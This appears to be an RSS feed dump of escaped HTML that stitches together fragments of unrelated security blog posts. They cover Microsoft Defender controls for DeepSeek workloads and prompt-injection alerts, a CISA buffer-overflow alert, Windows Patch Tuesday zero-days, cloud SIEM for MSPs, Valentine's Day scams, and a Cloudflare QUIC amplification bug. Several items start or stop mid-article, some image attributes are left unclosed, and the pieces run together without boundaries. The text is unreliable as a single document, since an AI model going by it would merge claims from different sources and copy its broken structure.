&lt;p&gt;By mapping out AI workloads and synthesizing security insights such as identity risks, sensitive data, and internet exposure, Defender for Cloud continuously surfaces contextualized security issues and suggests risk-based security recommendations tailored to prioritize critical gaps across your AI workloads. Relevant security recommendations also appear within the Azure AI resource itself in the Azure portal. This provides developers or workload owners with direct access to recommendations and helps them remediate cyberthreats faster.&amp;nbsp;&lt;/p&gt;



&lt;h3 class="wp-block-heading" id="safeguard-deepseek-r1-ai-workloads-with-cyberthreat-protection"&gt;Safeguard DeepSeek R1 AI workloads with cyberthreat protection&lt;/h3&gt;



&lt;p&gt;While having a strong security posture reduces the risk of cyberattacks, the complex and dynamic nature of AI requires active monitoring in runtime as well. No AI model is exempt from malicious activity and can be vulnerable to prompt injection cyberattacks and other cyberthreats. Monitoring the latest models is critical to ensuring your AI applications are protected.&lt;/p&gt;



&lt;p&gt;Integrated with Azure AI Foundry, Defender for Cloud continuously monitors your DeepSeek AI applications for unusual and harmful activity, correlates findings, and enriches security alerts with supporting evidence. This provides your security operations center (SOC) analysts with alerts on active cyberthreats such as jailbreak cyberattacks, credential theft, and sensitive data leaks. For example, when a prompt injection cyberattack occurs, Azure AI Content Safety prompt shields can block it in real-time. The alert is then sent to Microsoft Defender for Cloud, where the incident is enriched with Microsoft Threat Intelligence,&amp;nbsp;helping SOC analysts understand user behaviors with visibility into supporting evidence, such as IP address, model deployment details, and suspicious user prompts that triggered the alert.&amp;nbsp;&lt;/p&gt;


&lt;figure class="wp-block-image size-large"&gt;&lt;img alt="When a prompt injection attack occurs, Azure AI Content Safety prompt shields can detect and block it. The signal is then enriched by Microsoft Threat Intelligence, enabling security teams to conduct holistic investigations into the incident." class="wp-image-137331 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/02/Picture1-1-1024x470.webp" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;em&gt;Figure 2. Microsoft Defender for Cloud integrates with Azure AI to detect and respond to prompt injection cyberattacks&lt;/em&gt;.&lt;/figcaption&gt;&lt;/figure&gt;



&lt;p&gt;Additionally, these alerts integrate with &lt;a href="https://www.microsoft.com/security/business/siem-and-xdr/microsoft-defender-xdr" rel="noreferrer noopener" target="_blank"&gt;Microsoft Defender XDR&lt;/a&gt;, allowing security teams to centralize AI workload alerts into correlated incidents to understand the full scope of a cyberattack, including malicious activities related to their generative AI applications.&amp;nbsp;&lt;/p&gt;


&lt;figure class="wp-block-image size-full is-resized"&gt;&lt;img alt="A jailbreak prompt injection attack on a Azure AI model deployment was flagged as an alert in Defender for Cloud.

&lt;h2 class="wp-block-heading" id="secure-and-govern-the-use-of-the-deepseek-app"&gt;Secure and govern the use of the DeepSeek app&lt;/h2&gt;



&lt;p&gt;In addition to the DeepSeek R1 model, DeepSeek also provides a consumer app hosted on its local servers, where data collection and cybersecurity practices may not align with your organizational requirements, as is often the case with consumer-focused apps. This underscores the risks organizations face if employees and partners introduce unsanctioned AI apps leading to potential data leaks and policy violations. Microsoft Security provides capabilities to discover the use of third-party AI applications in your organization and provides controls for protecting and governing their use. &lt;a id="_msocom_1"&gt;&lt;/a&gt;&lt;/p&gt;



&lt;h3 class="wp-block-heading" id="secure-and-gain-visibility-into-deepseek-app-usage"&gt;Secure and gain visibility into DeepSeek app usage&amp;nbsp;&lt;/h3&gt;

&lt;/div&gt;



&lt;p&gt;Microsoft Defender for Cloud Apps provides ready-to-use risk assessments for more than 850 Generative AI apps, and the list of apps is updated continuously as new ones become popular. This means that you can discover the use of these Generative AI apps in your organization, including the DeepSeek app, assess their security, compliance, and legal risks, and set up controls accordingly. For example, for high-risk AI apps, security teams can tag them as unsanctioned apps and block user’s access to the apps outright.&lt;/p&gt;



&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="Security teams can discover the usage of GenAI applications, assess risk factors, and tag high-risk apps as unsanctioned to block end users from accessing them." class="wp-image-137397" height="480" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/02/DeepSeek-Blog-3.gif" width="853" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;em&gt;Figure 4. &lt;em&gt;Discover usage and control access to Generative AI applications based on their risk factors in Defender for Cloud Apps&lt;/em&gt;&lt;/em&gt;.&lt;/figcaption&gt;&lt;/figure&gt;

For example, the reports in DSPM for AI can offer insights on the type of sensitive data being pasted to Generative AI consumer apps, including the DeepSeek consumer app, so data security teams can create and fine-tune their data security policies to protect that data and prevent data leaks.&amp;nbsp;&lt;/p&gt;


&lt;figure class="wp-block-image size-large"&gt;&lt;img alt="In the report from Microsoft Purview Data Security Posture Management for AI, security teams can gain insights into sensitive data in user prompts and unethical use in AI interactions.

&lt;p&gt;The leakage of organizational data is among the top concerns for security leaders regarding AI usage, highlighting the importance for organizations to implement controls that prevent users from sharing sensitive information with external third-party AI applications.&lt;/p&gt;



&lt;p&gt;&lt;a href="https://www.microsoft.com/security/business/information-protection/microsoft-purview-data-loss-prevention" rel="noreferrer noopener" target="_blank"&gt;Microsoft Purview Data Loss Prevention (DLP)&lt;/a&gt; enables you to prevent users from pasting sensitive data or uploading files containing sensitive content into Generative AI apps from supported browsers. Your DLP policy can also adapt to insider risk levels, applying stronger restrictions to users that are categorized as ‘elevated risk’ and less stringent restrictions for those categorized as ‘low-risk’. For example, elevated-risk users are restricted from pasting sensitive data into AI applications, while low-risk users can continue their productivity uninterrupted. By leveraging these capabilities, you can safeguard your sensitive data from potential risks from using external third-party AI applications. Security admins can then investigate these data security risks and&amp;nbsp;perform insider risk investigations within Purview. These&amp;nbsp;same data security risks are surfaced in Defender XDR for holistic investigations.&lt;/p&gt;



&lt;figure class="wp-block-image size-full"&gt;&lt;img alt=" When a user attempts to copy and paste sensitive data into the DeepSeek consumer AI application, they are blocked by the endpoint DLP policy. " class="wp-image-137396" height="480" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/02/DeepSeek-DLP-2.gif" width="853" /&gt;&lt;figcaption class="wp-element-caption"&gt;&lt;em&gt;Figure 6. &lt;em&gt;Data Loss Prevention policy can block sensitive data from being pasted to third-party AI applications in supported browsers.&lt;/em&gt;&lt;/em&gt;&lt;/figcaption&gt;&lt;/figure&gt;



&lt;p&gt;This is a quick overview of some of the capabilities to help you secure and govern AI apps that you build on Azure AI Foundry and GitHub,&amp;nbsp;as well as AI apps that users in your organization use.&amp;nbsp;We hope you find this useful!&lt;/p&gt;

&lt;p&gt;Buffer overflow vulnerabilities are a prevalent type of defect in memory-safe software design that can lead to system compromise. These vulnerabilities can lead to data corruption, sensitive data exposure, program crashes, and unauthorized code execution. Threat actors frequently exploit these vulnerabilities to gain initial access to an organization’s network and then move laterally to the wider network.&lt;/p&gt;
&lt;p&gt;CISA and FBI urge manufacturers review the Alert and, where feasible, eliminate this class of defect by developing new software using memory-safe languages, using &lt;a href="https://www.cisa.gov/securebydesign" title="Secure by Design"&gt;secure by design&lt;/a&gt; methods, and implementing the best practices supplied in this Alert. CISA and FBI also urge &lt;a href="https://www.cisa.gov/resources-tools/resources/secure-demand-guide" title="Secure by Demand Guide: How Software Customers Can Drive a Secure Technology Ecosystem"&gt;software customers demand secure products&lt;/a&gt; from manufacturers that include these preventions.

&lt;p&gt;All supported Windows operating systems will receive an update this month for a buffer overflow vulnerability that carries the catchy name &lt;a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-21418" rel="noopener" target="_blank"&gt;CVE-2025-21418&lt;/a&gt;. This patch should be a priority for enterprises, as Microsoft says it is being exploited, has low attack complexity, and no requirements for user interaction.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Tenable&lt;/strong&gt; senior staff research engineer &lt;strong&gt;Satnam Narang&lt;/strong&gt; noted that since 2022, there have been nine elevation of privilege vulnerabilities in this same Windows component &amp;#8212; three each year &amp;#8212; including one in 2024 that was exploited in the wild as a zero day (CVE-2024-38193).&lt;/p&gt;
&lt;p&gt;&amp;#8220;CVE-2024-38193 was exploited by the North Korean APT group known as Lazarus Group to implant a new version of the FudModule rootkit in order to maintain persistence and stealth on compromised systems,&amp;#8221; Narang said. &amp;#8220;At this time, it is unclear if CVE-2025-21418 was also exploited by Lazarus Group.&amp;#8221;&lt;/p&gt;
&lt;p&gt;The other zero-day, &lt;a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-21391" rel="noopener" target="_blank"&gt;CVE-2025-21391&lt;/a&gt;, is an elevation of privilege vulnerability in Windows Storage that could be used to delete files on a targeted system. Microsoft&amp;#8217;s advisory on this bug references something called “CWE-59: Improper Link Resolution Before File Access,&amp;#8221; says no user interaction is required, and that the attack complexity is low.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Adam Barnett&lt;/strong&gt;, lead software engineer at &lt;strong&gt;Rapid7&lt;/strong&gt;, said although the advisory provides scant detail, and even offers some vague reassurance that &amp;#8216;an attacker would only be able to delete targeted files on a system,&amp;#8217; it would be a mistake to assume that the impact of deleting arbitrary files would be limited to data loss or denial of service.&lt;/p&gt;
&lt;p&gt;&amp;#8220;As long ago as 2022, ZDI researchers set out how a motivated attacker could parlay arbitrary file deletion into full SYSTEM access using techniques which also involve creative misuse of symbolic links,&amp;#8221;Barnett wrote.&lt;span id="more-70396"&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;One vulnerability patched today that was publicly disclosed earlier is &lt;a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-21377" rel="noopener" target="_blank"&gt;CVE-2025-21377&lt;/a&gt;, another weakness that could allow an attacker to elevate their privileges on a vulnerable Windows system. Specifically, this is yet another Windows flaw that can be used to steal NTLMv2 hashes &amp;#8212; essentially allowing an attacker to authenticate as the targeted user without having to log in.&lt;/p&gt;
&lt;p&gt;According to Microsoft, minimal user interaction with a malicious file is needed to exploit CVE-2025-21377, including selecting, inspecting or &amp;#8220;performing an action other than opening or executing the file.&amp;#8221;&lt;/p&gt;
&lt;p&gt;&amp;#8220;This trademark linguistic ducking and weaving may be Microsoft’s way of saying &amp;#8216;if we told you any more, we’d give the game away,'&amp;#8221; Barnett said. &amp;#8220;Accordingly, Microsoft assesses exploitation as more likely.&amp;#8221;&lt;/p&gt;
&lt;p&gt;The &lt;a href="https://isc.sans.edu/diary/Microsoft%20February%202025%20Patch%20Tuesday/31674" rel="noopener" target="_blank"&gt;SANS Internet Storm Center&lt;/a&gt; has a handy list of all the Microsoft patches released today, indexed by severity. Windows enterprise administrators would do well to keep an eye on &lt;a href="http://www.askwoody.com" rel="noopener" target="_blank"&gt;askwoody.com&lt;/a&gt;, which often has the scoop on any patches causing problems.&lt;/p&gt;
&lt;p&gt;It&amp;#8217;s getting harder to buy Windows software that isn&amp;#8217;t also bundled with Microsoft&amp;#8217;s flagship Copilot artificial intelligence (AI) feature. Last month Microsoft started bundling Copilot with &lt;strong&gt;Microsoft Office 365&lt;/strong&gt;, which Redmond has since rebranded as &amp;#8220;&lt;strong&gt;Microsoft 365 Copilot&lt;/strong&gt;.&amp;#8221; Ostensibly to offset the costs of its substantial AI investments, Microsoft also jacked up prices from 22 percent to 30 percent for upcoming license renewals and new subscribers.&lt;/p&gt;
&lt;p&gt;Office-watch.com &lt;a href="https://office-watch.com/2025/microsoft-365-classic/" rel="noopener" target="_blank"&gt;writes&lt;/a&gt; that existing Office 365 users who are paying an annual cloud license do have the option of &amp;#8220;Microsoft 365 Classic,&amp;#8221; an AI-free subscription at a lower price, but that many customers are not offered the option until they attempt to cancel their existing Office subscription.&lt;/p&gt;
&lt;p&gt;In other security patch news, &lt;strong&gt;Apple&lt;/strong&gt; has shipped iOS 18.3.1, which fixes a &lt;a href="https://support.apple.com/en-us/122174"&gt;zero day&lt;/a&gt; vulnerability (CVE-2025-24200) that is showing up in attacks.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Adobe&lt;/strong&gt; has issued security updates that fix a total of 45 vulnerabilities across &lt;strong&gt;InDesign&lt;/strong&gt;, &lt;strong&gt;Commerce&lt;/strong&gt;, &lt;strong&gt;Substance 3D&lt;/strong&gt; &lt;strong&gt;Stager&lt;/strong&gt;, &lt;strong&gt;InCopy&lt;/strong&gt;, &lt;strong&gt;Illustrator&lt;/strong&gt;, &lt;strong&gt;Substance 3D Designer&lt;/strong&gt; and &lt;strong&gt;Photoshop Elements&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;The post &lt;a href="https://www.webroot.com/blog/2025/02/11/the-rising-role-of-cloud-based-siem-in-mdr-what-msps-need-to-know/" rel="nofollow"&gt;The rising role of cloud-based SIEM in MDR: What MSPs need to know&lt;/a&gt; appeared first on &lt;a href="https://www.webroot.com/blog" rel="nofollow"&gt;Webroot Blog&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;p&gt;OpenText recently surveyed 255 MSPs to uncover key trends shaping the future of Managed Detection and Response (MDR). The findings reveal not only what cybersecurity professionals are prioritizing but also how MSPs can better meet the evolving demands of their small and midsize business (SMB) customers.&lt;/p&gt;



&lt;p&gt;One key takeaway from the survey: &lt;strong&gt;81% of respondents rated cloud-based SIEM (security information and event management) as important to include in their MDR solution&lt;/strong&gt;.&lt;/p&gt;



&lt;p&gt;Why is cloud-based SIEM such a big deal for an MDR? Because for MSPs delivering MDR services, it’s the backbone that makes scalability, visibility, central and efficient threat management possible.&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;Cloud-based SIEM is an essential MDR backbone&lt;/h2&gt;



&lt;p&gt;The modern attack surface is vast. Business customers are spread across hybrid infrastructures with data flowing through endpoints, networks, applications, and the cloud. Cloud-based SIEM-powered MDR services help MSPs stay on top of this complexity by serving as the single source of truth for detecting and responding to threats.&lt;/p&gt;



&lt;p&gt;Here’s why it matters:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Seamless data ingestion&lt;/strong&gt;&lt;br /&gt;Cloud-based SIEMs ingest security telemetry from diverse sources—EDR solutions, applications, cloud infrastructure, network packet data, and more—to deliver a holistic view of a customer’s environment.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;In-depth correlation and analysis&lt;/strong&gt;&lt;br /&gt;By correlating data across borderless infrastructures, SIEM provides security analysts with the context they need to identify, prioritize, and address the most impactful threats.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Scalability and accessibility&lt;/strong&gt;&lt;br /&gt;As businesses grow, so do their security needs. Cloud-based SIEM scales effortlessly, ensuring an MSP’s MDR services can handle large data volumes without compromising performance. Plus, analysts can access SIEM insights anywhere, anytime.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;In short, a cloud-based SIEM ensures that no corner of the customer’s attack surface is left unseen—from endpoint to cloud. It provides comprehensive visibility, continuously collecting, correlating and analyzing data from every layer of the IT environment. This means the MDR service can detect threats wherever they may arise, whether on-premises, in the cloud, or across hybrid infrastructures, giving MSPs the ability to respond quickly and effectively to any potential risk.&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;How SIEM drives faster MDR outcomes&lt;/h2&gt;



&lt;p&gt;Cyberattacks move fast. MSPs delivering MDR services need tools and processes that can keep pace with today’s threats. A cloud-based SIEM is the essential technology that enables the MDR service to deliver rapid detection, triage and investigation. Here’s how SIEM supports faster outcomes across every stage:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Rapid detection: &lt;/strong&gt;A cloud-based SIEM continuously ingests and correlates syslog data from all sources, reducing the time it takes to identify a threat after it emerges.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Time to triage: &lt;/strong&gt;By consolidating telemetry into a centralized platform, SIEM enables security analysts to quickly assess and prioritize incidents—cutting through the noise to focus on the most critical threats.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Accelerated investigation:&lt;/strong&gt; SIEM by leveraging threat intel provides the context analysts need to understand a threat, pinpoint its origin, and determine its potential impact—all without needing to manually stitch together insights.&lt;/li&gt;
&lt;/ul&gt;



&lt;h2 class="wp-block-heading"&gt;Expert-led, SIEM-enabled&lt;/h2&gt;



&lt;p&gt;When MSPs choose an MDR partner solution with a cloud-based SIEM at its core, they unlock more than just a sophisticated tool. They gain the advantage of expert-led security teams that can leverage the full potential of the SIEM platform to deliver rapid, precise, and continuous threat detection.&lt;/p&gt;



&lt;p&gt;The survey results highlight that MSPs see the distinct advantage of running an MDR service with a cloud-based SIEM, which enhances their ability to run a 24/7/365 security operations center (SOC). With SIEM as the central hub, security experts can quickly surface suspicious activity, centrally manage investigations and take swift action.&lt;/p&gt;



&lt;p&gt;The value of expert-led, SIEM-enabled MDR becomes even clearer when you consider the following benefits:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Round-the-clock SOC with seamless investigations&lt;/strong&gt;&lt;br /&gt;The ability to monitor and respond to threats 24/7X365 is critical for an MDR service. By consolidating threat data into a centralized cloud SIEM, experts can detect malicious activity at any time of day or night. This continuous monitoring reduces the risk of attackers moving undetected, ensuring that threats are neutralized before they can cause harm.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Single, integrated tool for investigation&lt;/strong&gt;&lt;br /&gt;The MDR survey results highlight the value MSPs place on having a unified toolset for threat detection and investigation. A cloud-based SIEM with threat intel provides this central hub, enabling security teams to efficiently assess the scope of incidents, prioritize based on severity, and track the attack’s progress in real-time. The SIEM can correlate data across multiple environments—whether it’s endpoint data, network logs, or cloud infrastructure—ensuring nothing slips through the cracks.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Expert insight into threat context&lt;/strong&gt;&lt;br /&gt;The SIEM doesn’t just provide raw data; it enriches that data with valuable context from threat intel , helping the MDR security experts to identify the root cause of a threat, its potential impact, and the fastest path to resolution.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;As cyber threats become more relentless and attack surfaces continue to expand, MSPs are in a unique position to help SMBs stay secure. OpenText’s MDR survey results highlight what’s clear: a cloud-based SIEM as part of an MSP’s MDR solution is a priority set up. It allows MSPs to deliver consistent, effective threat detection and response.&lt;/p&gt;



&lt;p&gt;By combining the right technology with the right expertise, MSPs can navigate the complexity of today’s cybersecurity landscape and give their customers the confidence to focus on what matters most: growing their business.&lt;/p&gt;

&lt;p&gt;And while &lt;strong&gt;February 14&lt;/strong&gt; usually means love is in the air, Valentine’s Day is also a popular day with internet scammers. In 2024, romance scams alone led to losses tallied to $3.8 billion according to the &lt;a href="https://verafin.com/2024/02/romance-scams-a-heartless-reality/" rel="noreferrer noopener" target="_blank"&gt;Nasdaq 2024 Global Financial Crime Report&lt;/a&gt;. Don’t be wooed by too-good-to-be-true offers, online dating scams, and fraudulent websites. Stay informed about common scams and take action to stay safe.&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;Common Valentine’s Day scams&lt;/h2&gt;



&lt;p&gt;&lt;strong&gt;Online dating scams&lt;/strong&gt;&lt;br /&gt;&lt;a href="https://cybermagazine.com/articles/ai-based-phishing-scams-are-on-the-rise-this-valentines-day" rel="noreferrer noopener" target="_blank"&gt;AI-powered phishing&lt;/a&gt; scams are on the rise, impersonating popular online dating platforms. Scammers send fake match emails with malicious links, pretending to be from legitimate dating websites.&lt;br /&gt;&lt;img alt="📌" class="wp-smiley" src="https://s.w.org/images/core/emoji/14.0.0/72x72/1f4cc.png" style="height: 1em;" /&gt; &lt;strong&gt;Tip: &lt;/strong&gt;Look for misspellings in the dating website name or web address and check the “from field” to make sure it’s a real address.&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;Trust your instincts&lt;/strong&gt;&lt;br /&gt;If something feels off—like a relationship escalating too quickly or seeming too perfect—listen to your gut.&lt;br /&gt;&lt;img alt="📌" class="wp-smiley" src="https://s.w.org/images/core/emoji/14.0.0/72x72/1f4cc.png" style="height: 1em;" /&gt; &lt;strong&gt;Tip:&lt;/strong&gt; Scammers often use rapid declarations of love to emotionally manipulate their victims.&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;Be cautious with platform switching&lt;/strong&gt;&lt;br /&gt;Think twice before moving a conversation off a dating app to a less secure platform.&lt;br /&gt;&lt;img alt="📌" class="wp-smiley" src="https://s.w.org/images/core/emoji/14.0.0/72x72/1f4cc.png" style="height: 1em;" /&gt; &lt;strong&gt;Tip: &lt;/strong&gt;Scammers often push for this to avoid detection.&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;Phony gift and delivery services&lt;/strong&gt;&lt;br /&gt;Scammers often lure victims with heavily discounted flowers, gifts, or even romantic getaway deals on unknown websites. These fraudsters go to great lengths to create the appearance of being legitimate florist, gift basket retailer, or travel agent, setting up websites, placing ads on social media, and sending emails. You go to the website enter your information and credit card details only to receive nothing or something that is not what you ordered.&lt;br /&gt;&lt;img alt="📌" class="wp-smiley" src="https://s.w.org/images/core/emoji/14.0.0/72x72/1f4cc.png" style="height: 1em;" /&gt; &lt;strong&gt;Tip:&lt;/strong&gt; Always verify websites by checking for HTTPS in the URL and reading online reviews before making a purchase.&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;E-card and gift card scams&lt;/strong&gt;&lt;br /&gt;While digital greeting cards and gift cards are a convenient way to spread love, they’re also a common tool for cybercriminals. Scammers send fake e-cards that contain malware or gift card phishing emails asking you to redeem them on fraudulent websites.&lt;br /&gt;&lt;img alt="📌" class="wp-smiley" src="https://s.w.org/images/core/emoji/14.0.0/72x72/1f4cc.png" style="height: 1em;" /&gt; &lt;strong&gt;Tip: &lt;/strong&gt;Never open e-cards from unknown senders, and never purchase gift cards as payment for someone you haven’t met in person.&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;How to protect your heart, computer, and wallet from these scams&lt;/h2&gt;



&lt;p&gt;&lt;strong&gt;Do your research&lt;/strong&gt;&lt;br /&gt;Before opening email or clicking links make sure they are being sent to you by a reputable brand. &lt;a href="https://www.webroot.com/us/en/home/products/av"&gt;Webroot Secure VPN + AntiVirus&lt;/a&gt; offer real-time protection for your connection and devices while you are browsing the internet.&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;Be cautious sharing personal information&lt;/strong&gt;&lt;br /&gt;Don&amp;#8217;t share sensitive information like credit card details or home address with any website or person unless you are confident in their identity. Consider investing in identity protection security solutions that will monitor the web for unauthorized usage and credit report monitoring, such as &lt;a href="https://www.webroot.com/us/en/home/products/premium"&gt;Webroot Premium&lt;/a&gt;.&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;Secure your devices and backup your data&lt;/strong&gt;&lt;br /&gt;Ensure your devices have the latest security updates installed. Use &lt;a href="https://www.carbonite.com/" rel="noreferrer noopener" target="_blank"&gt;Carbonite’s &lt;/a&gt;secure, automatic computer backup solution to protect important files from cyber threats.&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;Strengthen your passwords and use two-factor authentication&lt;/strong&gt;&lt;br /&gt;Make sure to use complex and unique passwords, incorporating letters, numbers and symbols. Consider enabling multi-factor authentication (MFA) for extra security—this helps verify your identity with a second step, like a text or email code. Solutions such as &lt;a href="https://www.webroot.com/us/en/home/products/premium"&gt;Webroot Premium&lt;/a&gt; and &lt;a href="https://www.webroot.com/us/en/home/products/av"&gt;Webroot AntiVirus&lt;/a&gt; include passwords managers to making it easier to remember all your passwords.&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;Use an all-in-one device, privacy, and protection solution&lt;/strong&gt;&lt;br /&gt;For complete device, privacy, and identity protection, consider a solution like &lt;a href="https://www.webroot.com/us/en/home/products/premium"&gt;Webroot Premium&lt;/a&gt; and get the best of all worlds –threat detection, password manager, dark web monitoring, and real-time virus protection.&lt;/p&gt;



&lt;p&gt;Let’s stay cyber resilient this February and keep Valentine’s Day scam-free! &lt;img alt="💙" class="wp-smiley" src="https://s.w.org/images/core/emoji/14.0.0/72x72/1f499.png" style="height: 1em;" /&gt;&lt;/p&gt;

We've implemented a mitigation.</description><content:encoded>&lt;p&gt;Cloudflare was recently contacted by a group of anonymous security researchers who discovered a broadcast amplification vulnerability through their &lt;a href="https://blog.cloudflare.com/tag/quic"&gt;&lt;u&gt;QUIC&lt;/u&gt;&lt;/a&gt; Internet measurement research. Our team collaborated with these researchers through our Public Bug Bounty program, and worked to fully patch a dangerous vulnerability that affected our infrastructure.&lt;/p&gt;&lt;p&gt;Since being notified about the vulnerability, we've implemented a mitigation to help secure our infrastructure. According to our analysis, we have fully patched this vulnerability and the amplification vector no longer exists. &lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Summary of the amplification attack&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#summary-of-the-amplification-attack"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;QUIC is an Internet transport protocol that is encrypted by default. It offers equivalent features to &lt;a href="https://www.cloudflare.com/learning/ddos/glossary/tcp-ip/"&gt;&lt;u&gt;TCP&lt;/u&gt;&lt;/a&gt; (Transmission Control Protocol) and &lt;a href="https://www.cloudflare.com/learning/ssl/transport-layer-security-tls/"&gt;&lt;u&gt;TLS&lt;/u&gt;&lt;/a&gt; (Transport Layer Security), while using a shorter handshake sequence that helps reduce connection establishment times. QUIC runs over &lt;a href="https://www.cloudflare.com/en-gb/learning/ddos/glossary/user-datagram-protocol-udp/"&gt;&lt;u&gt;UDP&lt;/u&gt;&lt;/a&gt; (User Datagram Protocol).&lt;/p&gt;&lt;p&gt;The researchers found that a single client QUIC &lt;a href="https://datatracker.ietf.org/doc/html/rfc9000#section-17.2.2"&gt;&lt;u&gt;Initial packet&lt;/u&gt;&lt;/a&gt; targeting a broadcast IP destination address could trigger a large response of initial packets. This manifested as both a server CPU amplification attack and a reflection amplification attack.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Transport and security handshakes&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#transport-and-security-handshakes"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;When using TCP and TLS there are two handshake interactions. First, is the TCP 3-way transport handshake. A client sends a SYN packet to a server, it responds with a SYN-ACK to the client, and the client responds with an ACK. This process validates the client IP address. Second, is the TLS security handshake. A client sends a ClientHello to a server, it carries out some cryptographic operations and responds with a ServerHello containing a server certificate. The client verifies the certificate, confirms the handshake and sends application traffic such as an HTTP request.&lt;/p&gt;&lt;p&gt;&lt;a href="https://datatracker.ietf.org/doc/html/rfc9000#section-7"&gt;&lt;u&gt;QUIC&lt;/u&gt;&lt;/a&gt; follows a similar process, however the sequence is shorter because the transport and security handshake is combined. A client sends an Initial packet containing a ClientHello to a server, it carries out some cryptographic operations and responds with an Initial packet containing a ServerHello with a server certificate. The client verifies the certificate and then sends application data.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/7wsMcFwy8xMRYwQyFNm6oC/5d131543e7704794776dfc3ed89c1693/image2.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;The QUIC handshake does not require client IP address validation before starting the security handshake. This means there is a risk that an attacker could spoof a client IP and cause a server to do cryptographic work and send data to a target victim IP (aka a &lt;a href="https://blog.cloudflare.com/reflections-on-reflections/"&gt;&lt;u&gt;reflection attack&lt;/u&gt;&lt;/a&gt;). &lt;a href="https://datatracker.ietf.org/doc/html/rfc9000"&gt;&lt;u&gt;RFC 9000&lt;/u&gt;&lt;/a&gt; is careful to describe the risks this poses and provides mechanisms to reduce them (for example, see Sections &lt;a href="https://datatracker.ietf.org/doc/html/rfc9000#section-8"&gt;&lt;u&gt;8&lt;/u&gt;&lt;/a&gt; and &lt;a href="https://datatracker.ietf.org/doc/html/rfc9000#section-9.3.1"&gt;&lt;u&gt;9.3.1&lt;/u&gt;&lt;/a&gt;). Until a client address is verified, a server employs an anti-amplification limit, sending a maximum of 3x as many bytes as it has received. Furthermore, a server can initiate address validation before engaging in the cryptographic handshake by responding with a &lt;a href="https://datatracker.ietf.org/doc/html/rfc9000#section-8.1.2"&gt;&lt;u&gt;Retry packet&lt;/u&gt;&lt;/a&gt;. The retry mechanism, however, adds an additional round-trip to the QUIC handshake sequence, negating some of its benefits compared to TCP. Real-world QUIC deployments use a range of strategies and heuristics to detect traffic loads and enable different mitigations.&lt;/p&gt;&lt;p&gt;In order to understand how the researchers triggered an amplification attack despite these QUIC guardrails, we first need to dive into how IP broadcast works.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Broadcast addresses&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#broadcast-addresses"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;In Internet Protocol version 4 (IPv4) addressing, the final address in any given &lt;a href="https://www.cloudflare.com/learning/network-layer/what-is-a-subnet/"&gt;&lt;u&gt;subnet&lt;/u&gt;&lt;/a&gt; is a special broadcast IP address used to send packets to every node within the IP address range. Every node that is within the same subnet receives any packet that is sent to the broadcast address, enabling one sender to send a message that can be “heard” by potentially hundreds of adjacent nodes. This behavior is enabled by default in most network-connected systems and is critical for discovery of devices within the same IPv4 network.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/49zGjFbeIv7RxZMM6W2i5V/9e9e5f2f3bd8401467887d488930f476/image3.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;The broadcast address by nature poses a risk of DDoS amplification; for every one packet sent, hundreds of nodes have to process the traffic. &lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Dealing with the expected broadcast&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#dealing-with-the-expected-broadcast"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
